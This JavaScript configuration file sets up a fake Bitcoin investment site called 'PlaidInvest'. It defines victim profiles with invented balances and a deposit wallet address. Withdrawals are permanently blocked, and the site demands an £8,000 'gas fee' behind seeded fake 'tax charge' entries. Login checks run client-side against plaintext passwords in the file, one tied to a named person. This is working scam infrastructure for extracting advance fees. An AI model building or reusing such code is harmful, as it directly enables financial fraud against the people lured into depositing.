(function () {
  var env = window.ENV || {};
  var balance = Number(env.balanceUsd);
  if (Number.isNaN(balance)) balance = 15500;

  var displayName = env.displayName || "Jerry McMillan";
  var platformName = env.platformName || "PlaidInvest";
  var initialDepositDate = env.initialDepositDate || "24/06/2026";
  var initialDepositCreatedAt = Number(env.initialDepositCreatedAt);
  if (Number.isNaN(initialDepositCreatedAt)) {
    initialDepositCreatedAt = new Date(2026, 5, 24).getTime();
  }

  var jerryCreds = {
    email: (env.loginEmail || "").trim(),
    password: env.loginPassword || "",
    username: (env.loginUsername || "").trim().toLowerCase()
  };

  var profiles = [
    {
      id: "jerry",
      displayName: displayName,
      username: jerryCreds.username || "",
      email: jerryCreds.email,
      password: jerryCreds.password,
      balanceUsd: balance,
      currency: "USD",
      currencyLabel: "USD",
      asset: "BTC",
      stable: false,
      withdrawalsBlocked: true,
      depositsBlocked: false,
      withdrawModalBody: "Withdrawals are currently unavailable on your account. Please contact support for assistance.",
      withdrawFeeAmount: null,
      withdrawFeeCurrency: null,
      initialDeposit: {
        id: "initial-deposit",
        amountUsd: balance,
        date: initialDepositDate,
        createdAt: initialDepositCreatedAt,
        type: "Deposit",
        asset: "BTC",
        status: "Completed"
      }
    },
    {
      id: "lawson",
      displayName: "Lawson Spedding",
      username: "lawsonspedding",
      email: "lawsonspedding",
      password: "LawsonSpedding",
      // 361,015.00 − 4,007.01 − 6,380.00 → 350,628.01 (set explicitly)
      balanceUsd: 350628.01,
      currency: "USDT",
      currencyLabel: "USDT",
      asset: "USDT",
      stable: true,
      stateVersion: "tax-v3",
      withdrawalsBlocked: true,
      depositsBlocked: true,
      withdrawModalTitle: "Withdrawal",
      withdrawModalBody: "GAS FEE of £8,000 is required to enable withdrawal on your account",
      withdrawFeeAmount: 8000,
      withdrawFeeCurrency: "GBP",
      depositModalTitle: "Deposits Unavailable",
      depositModalBody: "Deposits are currently unavailable on your account. Please contact support for assistance.",
      initialDeposit: {
        id: "initial-deposit",
        amountUsd: 361015,
        date: "23/07/2026",
        createdAt: new Date(2026, 6, 23).getTime(),
        type: "Deposit",
        asset: "USDT",
        status: "Completed"
      },
      seedHistory: [
        {
          id: "tax-charge-1",
          seed: true,
          date: "23/07/2026",
          createdAt: new Date(2026, 6, 23, 13, 0, 0).getTime(),
          completesAt: new Date(2026, 6, 23, 13, 0, 0).getTime(),
          amountUsd: 4007.01,
          type: "Tax Charge",
          asset: "GBP",
          amount: "-£4,007.01",
          status: "Completed"
        },
        {
          id: "tax-charge-2",
          seed: true,
          date: "23/07/2026",
          createdAt: new Date(2026, 6, 23, 12, 0, 0).getTime(),
          completesAt: new Date(2026, 6, 23, 12, 0, 0).getTime(),
          amountUsd: 6380,
          type: "Tax Charge",
          asset: "GBP",
          amount: "-£6,380.00",
          status: "Completed"
        }
      ]
    }
  ];

  window.SITE = {
    platformName: platformName,
    displayName: displayName,
    name: displayName,
    tagline: env.tagline || "Bitcoin Investment Platform",
    email: env.email || "support@plaidinvest.com",
    domain: "plaidinvest.online",
    year: 2026,
    btcPrice: 0,
    btcChange: 0,
    balanceUsd: balance,
    platformWallet: env.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2",
    withdrawalFeeUsd: Number(env.withdrawalFeeUsd) || 500,
    withdrawalsBlocked: env.withdrawalsBlocked !== false,
    initialDeposit: profiles[0].initialDeposit,
    credentials: {
      email: jerryCreds.email,
      password: jerryCreds.password
    },
    profiles: profiles,
    images: {
      btc: "/assets/icons/btc.svg",
      btcPng: "/assets/icons/btc.png",
      usd: "/assets/icons/usd.svg",
      eth: "/assets/icons/eth.png",
      favicon: "/assets/favicon.svg"
    }
  };

  window.SITE.getProfileById = function (id) {
    var list = window.SITE.profiles || [];
    for (var i = 0; i < list.length; i++) {
      if (list[i].id === id) return list[i];
    }
    return list[0] || null;
  };

  window.SITE.findProfile = function (login, password) {
    var key = (login || "").trim().toLowerCase();
    var pass = password || "";
    var list = window.SITE.profiles || [];
    for (var i = 0; i < list.length; i++) {
      var p = list[i];
      var email = (p.email || "").trim().toLowerCase();
      var username = (p.username || "").trim().toLowerCase();
      if (!pass || pass !== p.password) continue;
      if (key && (key === email || (username && key === username))) return p;
    }
    return null;
  };

  Object.freeze(window.SITE.images);
})();
